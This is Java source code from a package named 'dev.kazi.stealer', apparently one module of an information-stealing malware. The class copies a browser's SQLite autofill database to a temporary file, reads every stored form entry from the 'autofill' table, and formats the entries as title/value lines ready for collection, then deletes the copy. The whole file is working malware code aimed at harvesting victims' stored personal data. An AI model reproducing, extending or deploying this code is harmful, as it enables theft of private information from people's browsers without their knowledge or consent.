package dev.kazi.stealer.utils.decrypt.autofill;

import java.sql.SQLException;
import java.sql.ResultSet;
import java.sql.Statement;
import java.sql.Connection;
import java.sql.DriverManager;
import java.nio.file.Files;
import java.nio.file.CopyOption;
import java.util.UUID;
import java.util.HashSet;
import java.util.ArrayList;
import java.util.List;
import java.io.File;

public class AutoFillDecrypt {

    private File CARD_PATH;
    public List<String> AUTOFILL;
    
    public AutoFillDecrypt(final String path0, final String path1) {
        this.CARD_PATH = new File(path0);
        final File LOCAL_STATE_PATH = new File(path1);
        this.AUTOFILL = new ArrayList<String>();
    }
    
    public String getData() {
        final StringBuilder temp = new StringBuilder();
        this.AUTOFILL.forEach(autofill -> temp.append(autofill).append("\n"));
        return temp.toString();
    }
    
    public AutoFillDecrypt getAutoFill() {
        final HashSet<AutoFill> AUTOFILL = new HashSet<AutoFill>();
        Connection connection = null;
        File tempFile = null;
        try {
            tempFile = new File(UUID.randomUUID().toString());
            Files.copy(this.CARD_PATH.toPath(), tempFile.toPath(), new CopyOption[0]);
            Class.forName("org.sqlite.JDBC");
            connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
            final Statement statement = connection.createStatement();
            statement.setQueryTimeout(30);
            final ResultSet resultSet = statement.executeQuery("SELECT * FROM autofill");
            while (resultSet.next()) {
                this.parseCards(tempFile, "", AUTOFILL, resultSet);
            }
        }
        catch (final Exception exception) {
            try {
                if (connection != null) {
                    connection.close();
                }
            }
            catch (final Exception ex) {}
        }
        finally {
            try {
                if (connection != null) {
                    connection.close();
                }
            }
            catch (final Exception ex2) {}
        }
        tempFile.delete();
        return this;
    }
    
    private void parseCards(final File autoFillStore, final String name, final HashSet<AutoFill> autoFillSet, final ResultSet resultSet) throws SQLException {
        final String nameSite = resultSet.getString(1);
        final String value = resultSet.getString(2);
        if (name != null) {
            final String format = "Title: " + nameSite + "\nValue: " + value + "\n";
            this.AUTOFILL.add(format);
        }
    }
}
